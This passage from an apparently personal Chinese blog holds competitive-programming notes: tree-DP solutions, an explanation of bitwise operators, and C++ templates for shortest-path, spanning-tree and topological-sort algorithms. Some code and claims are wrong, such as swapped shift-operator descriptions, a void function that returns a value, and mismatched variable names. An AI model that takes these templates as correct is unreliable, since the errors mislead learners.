class="number">1</span>;k&lt;=min(son[a[i].Point]+<span class="number">1</span>,j);k++)</span><br><span class="line">            Get[now][j]=max(Get[now][j],Get[now<span class="number">-1</span>][j-k]+f[a[i].Point][k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=all+<span class="number">1</span>;i++)</span><br><span class="line">    f[x][i]=Get[now][i<span class="number">-1</span>]+Value[x];</span><br><span class="line">    <span class="keyword">return</span> all+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Link,<span class="number">0</span>,<span class="keyword">sizeof</span>(Link));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="keyword">sizeof</span>(num));</span><br><span class="line">    <span class="built_in">memset</span>(son,<span class="number">0</span>,<span class="keyword">sizeof</span>(son));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;y&gt;&gt;Value[i];</span><br><span class="line">        a[++len].Point=i;</span><br><span class="line">        a[len].Next=Link[y];</span><br><span class="line">        Link[y]=len;</span><br><span class="line">        num[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">0</span>][m+<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方法就是在多叉树上直接进行动态规划，这种方法十分粗暴，但是并不简单（只是我的方法），然后我再博客上看到黄学长写出来的代码之后，我就震惊了，没有多叉树转二叉树，但是代码十分精简，并且复杂度只有O(n<em>m)，比我写出来的O(n</em>n*m)不知道高到哪里去了！</p>
<p>下面是黄学长的代码（Linux下面需要附上初始值）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,t=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">301</span>],s[<span class="number">301</span>],ount[<span class="number">301</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">301</span>][<span class="number">301</span>],f[<span class="number">301</span>][<span class="number">301</span>];</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">list</span>[<span class="number">301</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tree_traversal</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>[++t]=k;</span><br><span class="line">    <span class="keyword">if</span>(s[k]==<span class="number">0</span>)&#123;<span class="keyword">return</span> ++ount[k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=s[k];i++)</span><br><span class="line">       ount[k]+=tree_traversal(a[k][i]);</span><br><span class="line">    <span class="keyword">return</span> ++ount[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> x;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;v[i];</span><br><span class="line">		a[x][++s[x]]=i;</span><br><span class="line">	&#125;</span><br><span class="line">    tree_traversal(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">		f[i][<span class="number">1</span>]=v[<span class="built_in">list</span>[i]];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n+<span class="number">1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;=m+<span class="number">1</span>;j++)</span><br><span class="line">		f[i][j]=max(f[i+<span class="number">1</span>][j<span class="number">-1</span>]+v[<span class="built_in">list</span>[i]],f[i+ount[<span class="built_in">list</span>[i]]][j]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>][m+<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的多叉转二叉的做法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,Value[<span class="number">600</span>],Brother[<span class="number">600</span>],x;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">600</span>][<span class="number">600</span>],Child[<span class="number">600</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(f[x][y]&gt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>||y==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f[x][y]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(Brother[x],y);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;y;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DFS(Brother[x],i);</span><br><span class="line">        DFS(Child[x],y-i<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> This=max(f[Brother[x]][y],f[x][y]);</span><br><span class="line">        f[x][y]=max(This,f[Brother[x]][i]+f[Child[x]][y-i<span class="number">-1</span>]+Value[x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">-1</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Child,<span class="number">0</span>,<span class="keyword">sizeof</span>(Child));</span><br><span class="line">    <span class="built_in">memset</span>(Brother,<span class="number">0</span>,<span class="keyword">sizeof</span>(Brother));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;Value[i];</span><br><span class="line">        Brother[i]=Child[x];</span><br><span class="line">        Child[x]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(Child[<span class="number">0</span>],m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[Child[<span class="number">0</span>]][m]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>树结构</tag>
      </tags>
  </entry>
  <entry>
    <title>位运算</title>
    <url>/2017/05/20/e62f3ddb06f9/</url>
    <content><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><blockquote>
<p>HAOI在位运算上吃了亏，无良老师乱定义运算符，害的我and当成xor进行运算，因此考完HAOI就来补位运算。</p>
</blockquote>
<h1 id="趋向于"><a href="#趋向于" class="headerlink" title="趋向于"></a>趋向于</h1><p>首先我列出来一个“趋向于”</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(n--&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>没错就是这样，我原本以为是什么位运算，结果就是自减之后判断时候是否大于某一个数。在100000000之内是略快于for的，但是超过100000000之后两者速度就相差无几了，甚至for略快于while，感觉这个东西没什么卵用（<del>写在代码里装高端</del>）。</p>
<h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><blockquote>
<p>其次放下来一张系统的图：</p>
</blockquote>
<p><img src="https://xorex.space/image/019.jpg"></p>
<p>这些运算符分别叫做 <code>and or xor not shl shr</code></p>
<p>但是 <code>C++</code> 里面只能使用 <code>and or xor</code> 三种进行计算，其他的必须输入符号，所以以后就一直用符号计算吧，本来想的是用单词进行计算的。但是一直试到了not之后进行运算，发现not竟然是“ ！”。看来是没有办法全部使用单词计算了。</p>
<h2 id="1-and运算-与运算-amp"><a href="#1-and运算-与运算-amp" class="headerlink" title="1. and运算(与运算 &amp; )"></a>1. and运算(与运算 &amp; )</h2><blockquote>
<p>and运算通常用于二进制的取位操作，例如一个数 and 1的结果就是取二进制的最末位。这可以用来判断一个整数的奇偶，二进制的最末位为0表示该数为偶数，最末位为1表示该数为奇数。</p>
</blockquote>
<p>00101</p>
<p>11100</p>
<p>————</p>
<p>00100</p>
<p>大概就是这样相同位的两个数字都为1，则为1；若有一个不为1，则为0</p>
<h2 id="2-or运算-或运算"><a href="#2-or运算-或运算" class="headerlink" title="2. or运算(或运算 | )"></a>2. or运算(或运算 | )</h2><blockquote>
<p>or运算通常用于二进制特定位上的无条件赋值，例如一个数or 1的结果就是把二进制最末位强行变成1。如果需要把二进制最末位变成0，对这个数or 1之后再减一就可以了，其实际意义就是把这个数强行变成最接近的偶数。</p>
</blockquote>
<p>00101</p>
<p>11100</p>
<p>————</p>
<p>11101</p>
<p>相同位只要一个为1即为1。</p>
<h2 id="3-xor运算-异或运算"><a href="#3-xor运算-异或运算" class="headerlink" title="3. xor运算(异或运算 ^ )"></a>3. xor运算(异或运算 ^ )</h2><blockquote>
<p>异或的符号是^。按位异或运算, 对等长二进制模式按位或二进制数的每一位执行逻辑按位异或操作. 操作的结果是如果某位不同则该位为1, 否则该位为0.</p>
</blockquote>
<p><code>(a xor b) xor b = a</code></p>
<p>xor运算的性质</p>
<p>1.交换律</p>
<p>2.结合律（即(a^b)^c == a^(b^c)）</p>
<p>3.对于任何数x，都有x^x=0，x^0=x 4、自反性 A XOR B XOR B = A xor 0 = A</p>
<p>然后我就列出来一个有意思的题：</p>
<blockquote>
<p>【例题】1-1000放在含有1001个元素的数组中，只有唯一的一个元素值重复，其它均只出现 一次。每个数组元素只能访问一次，设计一个算法，将它找出来；不用辅助存储空间，能否设计一个算法实现？</p>
</blockquote>
<p>这里有实现方法，都是比较好理解的。</p>
<p>就是利用上面的结合律和交换律来实现的，将所有的数全部异或，得到的结果与1^2^3^…^1000的结果进行异或，得到的结果就是重复数。i&lt;=1000;i++)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n,a=<span class="number">1</span>,b=a[<span class="number">1</span>]; <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">1001</span>;i++) b=b <span class="keyword">xor</span> a[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">1000</span>;i++) a=a <span class="keyword">xor</span> i;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;(b <span class="keyword">xor</span> a)&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>这种方法非常快的 (其实可以用高斯定理来解决，但是这也是一种高逼格的写法)</p>
<h2 id="4-not运算-取反运算"><a href="#4-not运算-取反运算" class="headerlink" title="4. not运算(取反运算 ~ )"></a>4. not运算(取反运算 ~ )</h2><blockquote>
<p>~ 运算的定义是把内存中的0和1全部取反。使用 ~ 运算时要格外小心，你需要注意整数类型有没有符号。如果 ~ 的对象是无符号整数（不能表示负数），那么得到的值就是它与该类型上界的差。</p>
</blockquote>
<p>如果是有符号的话，就是-n-1；</p>
<h2 id="5-shl运算-左移运算-lt-lt"><a href="#5-shl运算-左移运算-lt-lt" class="headerlink" title="5. shl运算(左移运算 &lt;&lt; )"></a>5. shl运算(左移运算 &lt;&lt; )</h2><blockquote>
<p>右移运算符，这个其实就是将二进制下的数，所以位数右移n位，然后得到一个比原来的数大n<em>2倍的数，可以用来</em>2运算。</p>
</blockquote>
<h2 id="6-shr运算-右移运算-gt-gt"><a href="#6-shr运算-右移运算-gt-gt" class="headerlink" title="6. shr运算(右移运算 &gt;&gt; )"></a>6. shr运算(右移运算 &gt;&gt; )</h2><blockquote>
<p>左移运算符，和右移是一样的，不过是除以n*2（这里二分用着应该很棒）。</p>
</blockquote>
<h2 id="一道神奇的题目"><a href="#一道神奇的题目" class="headerlink" title="一道神奇的题目"></a>一道神奇的题目</h2><p>下面列举出来一些有意思的东西。</p>
<p><strong>高低位交换</strong></p>
<blockquote>
<p>给出一个小于2^32的正整数。这个数可以用一个32位的二进制数表示（不足32位用0补足）。我们称这个二进制数的前16位为“高位”，后16位为“低位”。将它的高低位交换，我们可以得到一个新的数。试问这个新的数是多少（用十进制表示）。</p>
</blockquote>
<p>这道题其实用&gt;&gt;和&lt;&lt;运算符就好，一个左移16位，另外一个右移16位，然后进行或运算。核心代码只有一行，这比用模拟快的很多而且很好写。</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>图论模板</title>
    <url>/2017/05/20/9af0562da910/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>把所有的图论的代码都敲了一遍，以防止生疏QAQ</p>
</blockquote>
<h1 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy,<span class="keyword">int</span> vv)</span><span class="comment">//邻接表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++Len].Point=yy;</span><br><span class="line">    a[Len].Next=Link[xx];</span><br><span class="line">    a[Len].Value=vv;</span><br><span class="line">    Link[xx]=Len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="边表"><a href="#边表" class="headerlink" title="边表"></a>边表</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">line_init</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy,<span class="keyword">int</span> vv)</span><span class="comment">//边表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].x=xx;</span><br><span class="line">    a[len].y=y;</span><br><span class="line">    a[len].v=vv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Floyd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    d[i][j]=min(d[i][j],d[i][k]+d[k][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Dijkstra"><a href="#Dijkstra" class="headerlink" title="Dijkstra"></a>Dijkstra</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> Point)</span><span class="comment">//经过堆优化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> ID;</span><br><span class="line">        <span class="keyword">int</span> Value;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (note x,note y)</span><br><span class="line">        &#123; <span class="keyword">return</span> x.Value&gt;y.Value; &#125;</span><br><span class="line">    &#125;f[<span class="number">501</span>],This;</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;note&gt;Q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i].Value=<span class="number">123456789</span>;</span><br><span class="line">        f[i].ID=i;</span><br><span class="line">    &#125;</span><br><span class="line">    f[Point].Value=<span class="number">0</span>;</span><br><span class="line">    Q.push(f[Point]);</span><br><span class="line">    <span class="keyword">while</span>(Q.empty()==<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=Q.top(); Q.pop();</span><br><span class="line">		<span class="keyword">if</span>(List[This.ID]) <span class="keyword">continue</span>;</span><br><span class="line">		List[This.ID]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[This.ID];i!=<span class="number">0</span>;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(!List[a[i].Point]&amp;&amp;This.Value+a[i].Value&lt;f[a[i].Point].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            f[a[i].Point].Value=This.Value+a[i].Value;</span><br><span class="line">			Q.push(f[a[i].Point]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Bellman-Ford"><a href="#Bellman-Ford" class="headerlink" title="Bellman-Ford:"></a>Bellman-Ford:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Bellman_Ford</span><span class="params">(<span class="keyword">int</span> Point)</span><span class="comment">//注意用的是边表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">10</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    dis[Point]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> Really=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)<span class="comment">//枚举每一条边</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j].Value+dis[a[j].Point_x]&lt;dis[a[j].Point_y])</span><br><span class="line">            &#123;</span><br><span class="line">                dis[a[j].Point]=a[j].Value+dis[a[j].Point_x];</span><br><span class="line">                Really=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(Really==<span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//没有负环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//有负环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SPFA"><a href="#SPFA" class="headerlink" title="SPFA:"></a>SPFA:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">(<span class="keyword">int</span> Point)</span><span class="comment">//在NOIP级别比赛就用这个了</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">10</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    head=<span class="number">1</span>;tail=<span class="number">1</span>;dis[Point]=<span class="number">0</span>;</span><br><span class="line">    vis[Point]=<span class="literal">true</span>;Queue[<span class="number">1</span>]=Point;</span><br><span class="line">    all[Point]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=Queue[head++];</span><br><span class="line">        vis[This]=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[This];i!=<span class="number">0</span>;i=a[i].next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> That=a[i].Point;</span><br><span class="line">            <span class="keyword">if</span>(dis[This]+a[i].Value&lt;dis[That])</span><br><span class="line">            &#123;</span><br><span class="line">                dis[That]=dis[This]+a[i].Value;</span><br><span class="line">                <span class="keyword">if</span>(vis[That]==<span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Queue[++tail]=That;</span><br><span class="line">                    vis[That]=<span class="literal">true</span>;</span><br><span class="line">                    all[That]++;</span><br><span class="line">                    <span class="keyword">if</span>(all[That]&gt;n)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//有负环</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//没有负环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Prim"><a href="#Prim" class="headerlink" title="Prim:"></a>Prim:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Prim</span><span class="params">()</span><span class="comment">//本来可以搞堆优化的，但是性价比不高</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">10</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[<span class="number">1</span>];i!=<span class="number">0</span>;i=a[i].Next)</span><br><span class="line">    dis[a[i].Point]=a[i].Value;</span><br><span class="line">    vis[<span class="number">1</span>]=<span class="literal">true</span>; Length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mini=dis[<span class="number">0</span>],This=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">        <span class="keyword">if</span>(!vis[j]&amp;&amp;dis[j]&lt;mini)</span><br><span class="line">        &#123;</span><br><span class="line">            mini=dis[j];</span><br><span class="line">            This=j;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[This]=<span class="literal">true</span>;</span><br><span class="line">        Length+=mini;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Link[This];j!=<span class="number">0</span>;j=a[j].Next)</span><br><span class="line">        <span class="keyword">if</span>(!vis[a[j].Point]&amp;&amp;a[j].Value&lt;dis[a[j].Point])</span><br><span class="line">        dis[a[j].Point]=a[j].Value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Kruskal："><a href="#Kruskal：" class="headerlink" title="Kruskal："></a>Kruskal：</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注意kruskal用的是边表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> True_father=x;</span><br><span class="line">    <span class="keyword">while</span>(True_father!=father[True_father])</span><br><span class="line">    True_father=father[True_father];</span><br><span class="line">    <span class="keyword">while</span>(x!=True_father)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=father[x];</span><br><span class="line">        father[x]=True_father;</span><br><span class="line">        x=This;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True_father;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    father[i]=i;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">int</span> all=<span class="number">0</span>,Length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> First=Getfather(a[i].x);</span><br><span class="line">        <span class="keyword">int</span> Second=Getfather(a[i].y);</span><br><span class="line">        <span class="keyword">if</span>(First!=Second)</span><br><span class="line">        &#123;</span><br><span class="line">            Length+=a[i].Value;</span><br><span class="line">            father[First]=Second;</span><br><span class="line">            <span class="keyword">if</span>(++all==n<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以上就是Kruskal算法QAQ</span></span><br></pre></td></tr></table></figure>
<h1 id="Topsork："><a href="#Topsork：" class="headerlink" title="Topsork："></a>Topsork：</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Topsort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!Thing[i]) Queue[++tail]=i;</span><br><span class="line">    <span class="keyword">while</span>(head&lt;tail)</span><br><span class="line">    &#123;</span><br><span class="line">        head++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">if</span>(a[Queue[head]][i])</span><br><span class="line">        &#123;</span><br><span class="line">            Thing[i]--;</span><br><span class="line">            <span class="keyword">if</span>(!Thing[i])</span><br><span class="line">            Queue[++tail]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//题目中的无向图都不一定是联通的，需要访问每一个连通块：</span></span><br></pre></td></tr></table></figure>
